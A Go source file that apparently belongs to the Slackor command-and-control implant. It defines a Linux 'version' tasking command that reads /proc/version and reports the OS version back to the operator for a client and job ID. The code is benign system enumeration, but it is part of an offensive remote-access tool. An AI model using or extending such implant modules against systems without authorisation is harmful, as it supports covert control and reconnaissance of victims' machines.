// +build linux

package linux

import (
	"github.com/n00py/Slackor/internal/config"
	"github.com/n00py/Slackor/pkg/command"
	"io/ioutil"
	"strings"
)

// Version gets the OS version
type Version struct{}

// Name is the name of the command
func (ver Version) Name() string {
	return "version"
}

// Run gets the OS version
func (ver Version) Run(clientID string, jobID string, args []string) (string, error) {
	path := "/proc/version"
	content, _ := ioutil.ReadFile(path)
	version := strings.Split(string(content), "(")
	config.OSVersion = version[0]
	return config.OSVersion, nil
}

func init() {
	command.RegisterCommand(Version{})
}
